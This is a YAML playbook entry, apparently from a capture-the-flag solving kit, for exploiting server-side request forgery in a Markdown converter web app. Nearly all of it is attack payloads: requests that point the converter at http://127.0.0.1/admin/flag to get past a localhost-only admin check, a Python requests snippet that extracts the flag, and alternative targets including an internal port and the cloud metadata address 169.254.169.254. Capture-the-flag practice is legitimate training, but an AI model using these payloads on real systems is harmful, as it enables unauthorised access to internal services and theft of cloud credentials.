name: ssrf_markdown_converter
category: web
tags: [ssrf, localhost_bypass, urllib]
indicators:
  - "urllib.request.urlopen"
  - "remote_addr == '127.0.0.1'"
  - "URL input"
  - "Markdown converter"

tricks:
  - name: "Step 1: Identify SSRF"
    when: "Found URL input functionality"
    how: "urllib.request.urlopen(url) can request any URL"
    payload: |
      POST /convert
      url=http://127.0.0.1/

  - name: "Step 2: Bypass localhost restriction"
    when: "admin restricted to 127.0.0.1"
    how: "Use SSRF to access localhost from server"
    payload: |
      POST /convert
      url=http://127.0.0.1/admin/flag

  - name: "Step 3: Extract the flag"
    when: "Execute attack"
    how: "POST SSRF payload to access /admin/flag"
    payload: |
      resp = requests.post(f"{TARGET}/convert", data={
          "url": "http://127.0.0.1/admin/flag"
      })

  - name: "Alternative: Other SSRF exploits"
    when: "Explore internal network"
    how: "Access internal services via SSRF"
    payload: |
      url=http://127.0.0.1:8080/
      url=http://169.254.169.254/latest/meta-data/

